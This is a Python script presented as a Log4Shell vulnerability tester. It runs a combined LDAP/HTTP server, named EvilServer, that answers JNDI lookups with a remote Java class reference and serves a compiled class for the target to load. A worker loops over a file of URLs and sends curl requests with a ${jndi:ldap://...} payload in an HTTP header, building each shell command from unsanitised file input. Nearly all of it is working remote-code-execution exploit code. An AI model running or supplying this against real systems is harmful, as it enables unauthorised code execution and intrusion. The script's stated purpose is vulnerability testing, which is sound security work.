import sys
import socket
import select
import asn1
import hashlib
import threading
import time
import os

ASN1_BOOLEAN = 0x01
ASN1_INTEGER = 0x02 
ASN1_OCTETSTRING = 0x04
ASN1_NULL = 0x05
ASN1_SEQUENCE = 0x10 
ASN1_SET = 0x11
ASN1_APPLICATION = 0x40
 
LDAP_PROBE_REQ = bytearray.fromhex("300c020101600702010304008000") # 300c020101600702010304008000
LDAP_PROBE_ACK = bytearray.fromhex("300c02010161070a010004000400") # 300c02010161070a010004000400

def read_ldap_req(req): 
    decoder = asn1.Decoder()
    decoder.start(req)
    decoder.enter()
    decoder.read()
    decoder.enter()
    _, askedObject = decoder.read()
    return askedObject 

def add_ldap_reply_start(encoder): 
    encoder.enter(ASN1_SEQUENCE)
    encoder.write(0x01, ASN1_INTEGER)
    encoder.enter(1, ASN1_APPLICATION)
    encoder.write(00, 0x0a)
    encoder.write('', ASN1_OCTETSTRING)
    encoder.write('', ASN1_OCTETSTRING)
    encoder.leave()
    encoder.leave() 

def add_ldap_reply_end(encoder): 
    encoder.enter(ASN1_SEQUENCE)
    encoder.write(0x02, ASN1_INTEGER)
    encoder.enter(5, ASN1_APPLICATION)
    encoder.write(00, 0x0a)
    encoder.write('', ASN1_OCTETSTRING)
    encoder.write('', ASN1_OCTETSTRING)
    encoder.leave()
    encoder.leave() 

def add_ldap_content(encoder, askedObject, params): 
    encoder.enter(ASN1_SEQUENCE)
    encoder.write(ASN1_INTEGER, 0x02)
    encoder.enter(4, ASN1_APPLICATION)
    encoder.write(askedObject, ASN1_OCTETSTRING)
    encoder.enter(ASN1_SEQUENCE)
    for param in params.items():
        encoder.enter(ASN1_SEQUENCE)
        encoder.write(param[0], ASN1_OCTETSTRING)
        encoder.enter(ASN1_SET)
        for val in param[1]: 
            encoder.write(val, ASN1_OCTETSTRING)
        encoder.leave()
        encoder.leave() 
    encoder.leave()
    encoder.leave()
    encoder.leave()

def generate_ldap_response(askedObject, params): 
    encoder = asn1.Encoder()
    encoder.start()
    add_ldap_reply_start(encoder)
    add_ldap_content(encoder, askedObject, params)
    add_ldap_reply_end(encoder)
    return encoder.output()

def generate_objectclass_http_response(LIP, LPORT, identifier="NoIdentifier"): 
    f = open("JNDIObj.class", "rb")
    response_body_raw = f.read()
    f.close()
    replicant_url = "http://{}:{}/{}".format(LIP, LPORT, identifier)
    replicant_url_padded = '{:120}'.format(replicant_url)
    response_body_raw = response_body_raw.replace(b"URL_TO_CALL_BACK_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX_PLACEHOLDER", replicant_url_padded.encode())
    response_headers = {
        'Content-Type': 'application/java-vm',
        'Content-Length': len(response_body_raw),
        'Connection': 'close',
    }
    response_headers_raw = ''.join('%s: %s\n' % (k, v) for k, v in response_headers.items())
    return b"HTTP/1.0 200 OK" + b'\n' + response_headers_raw.encode() + b'\n' + response_body_raw
  
LOGGER_COLORS = ['\033[35;1m', '\033[36;1m', '\033[33;1m']
LOGGER_COLORS_CURRENT_INDEX = 0

class Logger (): 
    def __init__(self, threadName):
        global LOGGER_COLORS_CURRENT_INDEX 
        LOGGER_COLORS_CURRENT_INDEX += 1
        self.threadName = threadName
        self.color = LOGGER_COLORS[LOGGER_COLORS_CURRENT_INDEX % len(LOGGER_COLORS)]
    
    def log(self, log):
        endColor = '\033[0m'
        threadName = '{:10}'.format(self.threadName)
        print("[ " + self.color + threadName + endColor + "] " + "{}".format(log))

class URLListWorker (threading.Thread):
    def __init__(self, filename, baseUrl):    
        threading.Thread.__init__(self)  
        self.filename = filename 
        self.baseUrl = baseUrl
        self.logger = Logger("UrlTester")

    def JNDIChain(self, hash): 
        return '${}jndi:ldap://{}/{}{}'.format("{", self.baseUrl, hash, "}")

    def commandsForURL(self, url): 
        HASH=hashlib.md5(url.encode('utf-8')).hexdigest()
        return [
            "curl {} -H 'X-Api-Version: {}' > /dev/null 2>&1".format(url, self.JNDIChain(HASH + "-XAPI"))
        ]

    def run(self):
        URLS_FILE = self.filename
        with open(URLS_FILE) as file:
            for URL in file:
                URL=URL.rstrip()
                for command in self.commandsForURL(URL):
                    time.sleep(5)
                    self.logger.log(command)
                    os.system(command)
                    time.sleep(5)

        self.logger.log('All URLs checked')

class EvilServer (threading.Thread): 
    def __init__(self, IP, PORT):    
        threading.Thread.__init__(self)  
        self.IP = IP
        self.PORT = PORT 
        self.logger = Logger('EvilServ')
        self.shouldStop = False
        self.server = None

    def stop(self): 
        self.logger.log('Stopping server ...')
        self.shouldStop = True 
        self.server.close() 
        self.logger.log('Server stopped')

    def run(self):
        BUFFER_SIZE = 2048
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.IP,self.PORT))
        self.server.listen(1)
        rxset = [self.server]
        txset = []

        self.logger.log('Server started on {}:{}'.format(self.IP, self.PORT))
        while 1:
            if self.shouldStop: 
                break
            rxfds = []
            try:
                rxfds, txfds, exfds = select.select(rxset, txset, rxset)
            except: 
                self.logger.log("No new connections")
            for sock in rxfds:
                if sock is self.server:
                    conn, addr = self.server.accept()
                    conn.setblocking(0)
                    rxset.append(conn)
                    self.logger.log('Connection from address: {}'.format(addr))
                else:
                    try:
                        data = sock.recv(BUFFER_SIZE)
                        if len(data) > 0: 
                            LIP = sock.getsockname()[0]
                            LPORT = sock.getsockname()[1]
                            if data == LDAP_PROBE_REQ: # IS AN LDAP PROBE  
                                sock.send(LDAP_PROBE_ACK)
                            elif data[0] == 48: # IS AND LDAP QUERY 
                                askedObject = read_ldap_req(data)
                                params = {
                                    "javaClassName": ["foo"], 
                                    "javaCodeBase": ["http://{}:{}/{}/".format(LIP, LPORT, askedObject.decode())], 
                                    "objectClass": ["javaNamingReference"], 
                                    "javaFactory": ["JNDIObj"]
                                }
                                resp = generate_ldap_response(askedObject, params)
                                sock.send(resp)
                                rxset.remove(sock)
                                sock.close()
                            elif data[0:3] == b"GET": # IS AN HTTP GET REQUEST 
                                identifier = data[4:].decode().split('/')[1]
                                if identifier == 'confirm': 
                                    identifier = data[4:].decode().split('/')[2].split(' ')[0]
                                    self.logger.log('Vulnerability confirmed for: \033[91m{}\033[0m'.format(identifier))
                                    rxset.remove(sock)
                                    sock.close()
                                else: 
                                    sock.send(generate_objectclass_http_response(LIP, LPORT, 'confirm/{}'.format(identifier)))
                                    rxset.remove(sock)
                                    sock.close()
                            else: 
                                self.logger.log('unknown request')
                    except:
                        self.logger.log("Connection closed by remote end")
                        rxset.remove(sock)
                        sock.close()
   
print("")
print("######################################################")
print("#                                                    #")
print("#           LOG4SHELL VULNERABILITY TESTER           #")
print("#                                                    #")
print("#   This program is used to test Log4Shell vuln.     #")
print("#   it is designed to run both, LDAP and HTTP srv.   #")
print("#   on the same port for some organization purpose   #")
print("#                                                    #")
print("#   Note: it is written in the objective to have     #")
print("#       no extra dependencies than pythons ones      #")
print("#                                                    #")
print("#                                Ludovic DECAMPY     #")
print("#                                                    #")
print("######################################################")
print("")

if len(sys.argv) < 3: 
    print('Usage   : python3 {} <listening ip> <listening port> [urls.txt]'.format(sys.argv[0]))
    print('Example : python3 {} 127.0.0.1 8080'.format(sys.argv[0]))
    print('Example : python3 {} 127.0.0.1 8080 urls.txt'.format(sys.argv[0]))
    sys.exit(); 

IP = sys.argv[1]
PORT = int(sys.argv[2])
URL = "{}:{}".format(IP, PORT)

MainLogger = Logger('Main')
MainLogger.log("Usage: ")
MainLogger.log("    curl <target> -H 'X-Api-Version: ${}jndi:ldap://{}/<unique hash>{} '".format("{",URL, "}"))

evilServ = EvilServer(IP, PORT)
evilServ.start() 

if len(sys.argv) == 4: 
    urlListWorker = URLListWorker(sys.argv[3], URL)
    urlListWorker.run()
    evilServ.stop()

evilServ.join()